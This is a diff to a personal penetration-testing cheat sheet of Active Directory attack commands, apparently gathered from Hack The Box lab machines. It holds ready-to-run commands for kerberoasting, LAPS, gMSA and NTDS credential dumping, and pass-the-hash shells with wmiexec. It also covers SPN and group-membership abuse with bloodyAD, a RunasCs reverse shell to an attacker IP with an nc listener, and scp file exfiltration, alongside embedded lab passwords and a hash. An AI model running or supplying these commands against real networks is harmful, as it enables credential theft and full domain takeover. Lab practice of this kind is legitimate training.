@@ -760,22 +760,6 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 
-
-```
-## command 
-
-```
-# run nmap speed
-ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
-nmap -p$ports -sC -sV 10.10.11.158
-
-# command synch time ad
-sudo ntpdate dc.voleur.htb
-
-# command to download bloodyAD
-pip3 install bloodyad
-pip3 install --upgrade minikerberos
-
 ```
 ## bloodhound 
 
@@ -799,20 +783,33 @@ bloodhound
 # auth with smb 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
 
-# auth with smb by kerberoas
+# auth with smb by kerberoas when NTLM dissable
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k
 
 # auth with winrm  
 netexec winrm  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 
 
 # auth with ldap  
-netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 
+netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
+
+# auth with ldap by kerberoas when NTLM dissable
+netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k
+
+# generate and auth by file krb5.conf
+netexec smb 10.10.11.76 --generate-krb5-file krb5.conf
+sudo cp krb5.conf /etc/krb5.conf
 
 # list users 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users
 
 # list shares 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
+
+# list all in folder share IT  
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares --spider IT --regex .
+
+# get file in folder share IT  
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --share IT --get-file 'First-Line Support\\a.xlsx' a.xlsx 
 
 # try auth with user and pass in 2 file ( no  bruteforce ) 
 netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --no-bruteforce --continue-on-success
@@ -823,7 +820,7 @@ netexec smb dc01.fluffy.htb -u user.txt -p pass.txt --continue-on-success
 # p.agila can read the LAPS password from the ms-MCS-AdmPwd property  ( p.agila need have   ReadLAPSPassword permission) 
 netexec smb dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --laps --ntds
 
-# Kerberoasting ( Kerberoasting with auth kerberoas ) 
+# Kerberoasting ( Kerberoasting with auth kerberoas when NTLM dissable) 
 netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -  
 or 
 netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k --kerberoasting svc_winrm.hash 
@@ -833,6 +830,12 @@ netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M adcs
 
 # p.agila have ReadGMSAPassword permission can reed password of machine account 
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --gmsa
+
+# command to list deleted user and object and restore it ( p.agila need restore user permission ) 
+netexec.py ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k -M tombstone -o ACTION=query
+netexec.py ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -k -M tombstone -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db SCHEME=ldap
+
+
 
 ```
 ## certipy
@@ -857,7 +860,7 @@ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
 # adding the p.agila user to the Service Accounts group
 bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
 
-# adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred )   ( or auth by kerberoas) 
+# adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred )   ( or auth by kerberoas when NTLM dissable) 
 bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/whatever'
 or
 bloodyAD -d tombwatcher.htb -k --host dc01.tombwatcher.htb -p 'H3nry_987TGV!' set object svc_winrm servicePrincipalName -v 'http/whatever' 
@@ -878,6 +881,84 @@ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb ad
 bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb get object 'DC$' --attr ms-mcs-AdmPwd
 
 
+```
+## command 
+
+```
+# run nmap speed
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV 10.10.11.158
+
+# command to download bloodyAD
+pip3 install bloodyad
+pip3 install --upgrade minikerberos
+
+# command synch time ad
+sudo ntpdate dc.voleur.htb
+
+# command to generate hosts file 
+netexec smb 10.10.11.76 --generate-hosts-file hosts
+cat hosts /etc/hosts | sponge /etc/hosts
+
+# auth with kerberoas in AD by netexec ( flag -k )  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb) 
+sudo ntpdate dc.voleur.htb
+netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k --generate-krb5-file voleur.krb5
+sudo cp voleur.krb5  /etc/krb5.conf
+kinit svc_winrm
+evil-winrm -i dc.voleur.htb -r voleur.htb
+
+# auth with kerberoas in AD by impacket-getTGT  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
+impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76       (Saving ticket in svc_winrm.ccache)
+export KRB5CCNAME=svc_winrm.ccache
+evil-winrm -i dc.voleur.htb -r voleur.htb
+
+
+below is file /etc/krb5.conf : 
+
+``````````````````````````````
+[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = VOLEUR.HTB
+
+[realms]
+    VOLEUR.HTB = {
+        kdc = dc.voleur.htb
+        admin_server = dc.voleur.htb
+        default_domain = voleur.htb
+    }
+
+[domain_realm]
+    .voleur.htb = VOLEUR.HTB
+    voleur.htb = VOLEUR.HTB
+`````````````````````````````````
+
+# command AD Recyclebin in powershell
+Get-ADOptionalFeature 'Recycle Bin Feature'
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
+Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
+
+
+# command run RunasCs.exe to connect reverse shell ( can use to run shell in another user when have credentials but not have ssh or winrm) 
+ .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.6:443  
+rlwrap -cAr nc -lnvp 443
+
+# command  use secretsdump.py to dump 
+secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
+
+# command  get shell by wmiexec.py
+wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
+
+# command  Kerberoasting ( auth with kerberoas when NTLM dissable )  by targetedKerberoast.py
+impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.7             ( Saving ticket in svc_ldap.ccache) 
+export KRB5CCNAME=svc_ldap.ccache
+python3 targetedKerberoast.py -d voleur.htb --dchost DC -u svc_ldap@voleur.htb -k
+
+# command scp download all file in folder shares to local
+scp  svc_backup@dc.voleur.htb:/mnt/c/IT/* .
+
+# command scp upload all file in folder local to folder shares
+scp * svc_backup@dc.voleur.htb:/mnt/c/IT/
 
 
 ```
